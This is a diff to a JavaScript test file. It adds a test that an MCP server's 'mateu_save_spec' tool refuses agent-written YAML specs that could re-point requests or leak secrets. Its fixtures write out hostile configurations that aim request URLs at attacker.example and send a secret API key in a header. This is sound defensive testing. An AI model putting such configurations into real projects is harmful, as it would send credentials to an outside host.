@@ -10,7 +10,7 @@ import { fileURLToPath } from "node:url";
 import { dirname, join } from "node:path";
 import { handleRpc } from "./index.mjs";
 import { MateuWire } from "./wire.mjs";
-import { RESOURCE_FILES, isAcceptablePath, refusal, suggest } from "./authoring.mjs";
+import { RESOURCE_FILES, REQUEST_REFUSAL, catalogueRefusal, isAcceptablePath, refusal, suggest } from "./authoring.mjs";
 
 const here = dirname(fileURLToPath(import.meta.url));
 const corpus = JSON.parse(readFileSync(join(here, "..", "..", "conformance", "mcp", "authoring.json"), "utf8"));
@@ -305,6 +305,46 @@ test("save_spec: a valid definition is written (folders created); one with error
   const refused = json(await call("mateu_save_spec", { path: "b.yaml", yaml: "type: X" }, failing.wire, devEnv(tmp)));
   assert.deepEqual(refused, { saved: false, reason: "The definition has errors; nothing was written.", validation: bad });
   assert.ok(!existsSync(join(tmp, "b.yaml")));
+});
+
+// NM3: an agent saves what a screen is made of, never what decides a request.
+const AGENT_REFUSED = [
+  ["pay.yaml", "sources", "type: Sources\nsources:\n  - name: pay\n    source:\n      url: https://x\n"],
+  ["prod.yaml", "environment", "type: Environment\nsources:\n  pay:\n    url: https://attacker.example\n"],
+  ["r.yaml", "routes", "type: Routes\nroutes:\n  - route: x\n    layout: x.yaml\n"],
+  ["p1.yaml", "component", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    headers:\n      X-Api-Key: ${secret.API_KEY}\n"],
+  ["p1b.yaml", "component", 'type: Text\ntext: "\\u0024{secret.API_KEY}"\n'],
+  ["p2.yaml", "component", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    proxy: true\n"],
+  ["p3.yaml", "component", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n    url: https://attacker.example\n"],
+];
+
+test("save_spec: refuses what could re-point a request or leak a secret", async (t) => {
+  const tmp = realpathSync(mkdtempSync(join(tmpdir(), "mateu-mcp-")));
+  t.after(() => rmSync(tmp, { recursive: true, force: true }));
+  for (const [path, kind, yaml] of AGENT_REFUSED) {
+    const { wire } = validatingBackend({ valid: true, kind, errors: [], warnings: [] });
+    const result = json(await call("mateu_save_spec", { path, yaml }, wire, devEnv(tmp)));
+    assert.equal(result.saved, false, yaml);
+    assert.ok(
+      result.reason.startsWith("Only a page, a partial or a business-component catalogue can be saved by an agent;") ||
+        result.reason === REQUEST_REFUSAL,
+      result.reason,
+    );
+    assert.ok(!existsSync(join(tmp, path)), path);
+  }
+  for (const path of ["sources.yaml", "x/routes.yml", "environments/prod.yaml"]) {
+    const { wire, sent } = validatingBackend({ valid: true, kind: "component", errors: [], warnings: [] });
+    const text = errorOf(await call("mateu_save_spec", { path, yaml: "type: Text" }, wire, devEnv(tmp)));
+    assert.equal(text, "Error: " + catalogueRefusal(path), path);
+    assert.equal(sent.length, 0);
+    assert.ok(!existsSync(join(tmp, path)), path);
+  }
+  // a page naming a catalogue source by ref, mapping its own response, is written
+  const ok = validatingBackend({ valid: true, kind: "component", errors: [], warnings: [] });
+  const saved = json(
+    await call("mateu_save_spec", { path: "ok.yaml", yaml: "type: Button\nrestAction:\n  source:\n    ref: payments\n" }, ok.wire, devEnv(tmp)),
+  );
+  assert.equal(saved.saved, true);
 });
 
 test("save_spec: no specs directory is a caller error", async () => {
